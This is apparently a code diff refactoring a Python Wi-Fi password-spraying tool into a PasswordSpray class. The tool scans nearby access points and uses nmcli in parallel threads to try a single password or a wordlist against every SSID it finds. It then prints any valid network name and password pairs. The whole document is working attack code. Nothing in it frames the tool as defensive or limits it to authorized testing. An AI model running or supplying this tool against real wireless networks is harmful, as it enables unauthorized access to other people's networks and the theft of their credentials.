@@ -21,7 +21,7 @@ class NMCli(NetworkManager):
         nmcli.device.wifi_connect(ssid, password, wait=3)
 
 
-class ScanAccessPoints:
+class AccessPointScanner:
 
     def __init__(self, interface_name):
         self.access_points = {}
@@ -125,19 +125,106 @@ class ScanAccessPoints:
                 pass
 
 
-def read_word(file):
-    file.seek(0, io.SEEK_END)
-    file_size = file.tell()
-    file.seek(0, io.SEEK_SET)
+class PasswordSpray:
 
-    word = ""
+    def __init__(self, arguments):
+        self.arguments = arguments
+        self.is_password_list = (
+            True if os.path.exists(arguments.password) else False
+        )
+        self.wait_for_results = True if arguments.wait else False
+        self.interface_name = arguments.interface
+        self.scanner = AccessPointScanner(self.interface_name)
+        self.scanner.scan()
+        self.access_points = self.scanner.access_points
+        self.network_manager = NMCli()
+        self.lock = threading.Lock() if self.wait_for_results else False
 
-    while True:
-        word += file.read(1)
-        if "\n" in word or file.tell() == file_size:
-            value = word.strip()
-            word = ""
-            yield value
+    def read_word(self, file):
+        file.seek(0, io.SEEK_END)
+        file_size = file.tell()
+        file.seek(0, io.SEEK_SET)
+
+        word = ""
+
+        while True:
+            word += file.read(1)
+            if "\n" in word or file.tell() == file_size:
+                value = word.strip()
+                word = ""
+                yield value
+
+    def check_login(
+        self,
+        login_function,
+        password,
+    ):
+        for ssid in self.access_points.values():
+            thread = threading.Thread(
+                target=login_function,
+                kwargs={
+                    "lock": self.lock,
+                    "network_manager": self.network_manager,
+                    "ssid": ssid,
+                    "password": password,
+                    "wait": self.wait_for_results,
+                },
+            )
+            thread.daemon = True
+            thread.start()
+
+        if self.lock:
+            for thread in threading.enumerate():
+                if thread != threading.current_thread():
+                    thread.join()
+        else:
+            print(
+                Fore.BLUE
+                + "You will not see successful login results,"
+                + " but your system should automatically"
+                + " connect if there was any successful login"
+                + Style.RESET_ALL
+            )
+
+    def print_valid_credentials(self):
+        if self.scanner.successful_logins:
+            print(f"\n{Fore.BLUE}Valid credentials{Style.RESET_ALL}")
+
+            for access_point in self.scanner.successful_logins:
+                ssid = list(access_point.keys())[0]
+                password = list(access_point.values())[0]
+                print(f"{Fore.BLUE}{ssid} : {password}{Style.RESET_ALL}")
+
+            print()
+            self.scanner.successful_logins = []
+
+    def check(self):
+        if self.is_password_list:
+            self.wait_for_results = True
+            self.lock = threading.Lock()
+            file = open(self.arguments.password, "r")
+            read_word_generator = self.read_word(file)
+            password = ""
+
+            while True:
+                password = next(read_word_generator)
+                self.check_login(
+                    self.scanner.login,
+                    password,
+                )
+                self.print_valid_credentials()
+                time.sleep(3)
+
+                if not password:
+                    break
+
+            file.close()
+        else:
+            self.check_login(
+                self.scanner.login,
+                self.arguments.password,
+            )
+            self.print_valid_credentials()
 
 
 def get_arguments():
@@ -169,97 +256,7 @@ def get_arguments():
     return args
 
 
-def check_login(
-    access_points,
-    login_function,
-    thread_lock,
-    network_manager,
-    password,
-    wait,
-):
-    for ssid in access_points.values():
-        thread = threading.Thread(
-            target=login_function,
-            kwargs={
-                "lock": thread_lock,
-                "network_manager": network_manager,
-                "ssid": ssid,
-                "password": password,
-                "wait": wait,
-            },
-        )
-        thread.daemon = True
-        thread.start()
-
-    if thread_lock:
-        for thread in threading.enumerate():
-            if thread != threading.current_thread():
-                thread.join()
-    else:
-        print(
-            Fore.BLUE
-            + "You will not see successful login results,"
-            + " but your system should automatically"
-            + " connect if there was any successful login"
-            + Style.RESET_ALL
-        )
-
-
-def print_valid_credentials(scanner):
-    if scanner.successful_logins:
-        print(f"\n{Fore.BLUE}Valid credentials{Style.RESET_ALL}")
-
-        for access_point in scanner.successful_logins:
-            ssid = list(access_point.keys())[0]
-            password = list(access_point.values())[0]
-            print(f"{Fore.BLUE}{ssid} : {password}{Style.RESET_ALL}")
-
-        print()
-        scanner.successful_logins = []
-
-
 if __name__ == "__main__":
     arguments = get_arguments()
-    is_password_list = True if os.path.exists(arguments.password) else False
-    wait_for_results = True if arguments.wait else False
-    interface_name = arguments.interface
-    scanner = ScanAccessPoints(interface_name)
-    scanner.scan()
-    access_points = scanner.access_points
-    network_manager = NMCli()
-    lock = threading.Lock() if wait_for_results else False
-
-    if is_password_list:
-        wait_for_results = True
-        lock = threading.Lock()
-        file = open(arguments.password, "r")
-        read_word_generator = read_word(file)
-        password = ""
-
-        while True:
-            password = next(read_word_generator)
-            check_login(
-                access_points,
-                scanner.login,
-                lock,
-                network_manager,
-                password,
-                wait_for_results,
-            )
-            print_valid_credentials(scanner)
-            time.sleep(5)
-
-            if not password:
-                break
-
-        file.close()
-    else:
-        check_login(
-            access_points,
-            scanner.login,
-            lock,
-            network_manager,
-            arguments.password,
-            wait_for_results,
-        )
-        print_valid_credentials(scanner)
+    password_spray = PasswordSpray(arguments)
+    password_spray.check()
